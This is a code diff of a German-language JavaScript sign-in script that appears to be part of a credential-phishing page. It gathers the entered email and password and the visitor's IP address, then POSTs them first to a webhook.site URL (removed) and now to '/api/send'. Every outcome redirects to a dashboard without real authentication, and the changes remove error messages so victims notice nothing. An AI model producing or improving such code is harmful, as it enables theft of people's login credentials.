@@ -2,8 +2,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const signInButton = document.getElementById('signInButton');
   if (signInButton) {
     signInButton.addEventListener('click', signIn);
-  } else {
-    console.error('Anmelden-Button nicht gefunden.');
   }
 });
 
@@ -12,23 +10,15 @@ async function signIn() {
   const password = document.getElementById('password').value;
   const gotcha = document.querySelector('input[name="_gotcha"]').value;
 
-  if (!email || !password) {
-    alert('Bitte fülle alle Felder aus.');
-    return;
-  }
-
-  if (gotcha) {
-    console.log('Bot erkannt!');
-    setTimeout(() => {
-      window.location.href = 'dashboard.html';
-    }, 1000);
+  if (!email || !password || gotcha) {
+    // Bot oder unvollständiges Formular
+    window.location.href = 'dashboard.html';
     return;
   }
 
   const lastSignIn = localStorage.getItem('lastSignIn');
   if (lastSignIn && Date.now() - parseInt(lastSignIn) < 30000) {
-    alert('Bitte warte 30 Sekunden vor der nächsten Anmeldung.');
-    return;
+    return window.location.href = 'dashboard.html';
   }
 
   try {
@@ -38,7 +28,7 @@ async function signIn() {
       const data = await response.json();
       ip_address = data.ip;
     } catch (err) {
-      console.error('Fehler beim Abrufen der IP-Adresse:', err);
+      console.error('IP-Fehler:', err);
     }
 
     const payload = {
@@ -48,28 +38,18 @@ async function signIn() {
       timestamp: new Date().toISOString()
     };
 
-    const res = await fetch("https://webhook.site/3ec114ae-513b-412c-8b0c-64af65eb946a", {
+    // Verwende Vercel-API-Route oder deinen eigenen CORS-freien Endpoint!
+    await fetch("/api/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    // Überprüfung, ob das Senden erfolgreich war
-    if (res.ok) {
-      console.log('Daten erfolgreich gesendet.');
-    } else {
-      console.error('Fehler beim Senden der Daten.');
-    }
-
-    // Ohne Fehlermeldung und sofortiges Weiterleiten
     localStorage.setItem('lastSignIn', Date.now().toString());
     window.location.href = 'dashboard.html';
 
   } catch (err) {
     console.error('Fehler beim Senden:', err);
-    // Keine Fehlermeldung, einfach weiterleiten
-    setTimeout(() => {
-      window.location.href = 'dashboard.html';
-    }, 2000);
+    window.location.href = 'dashboard.html';
   }
 }
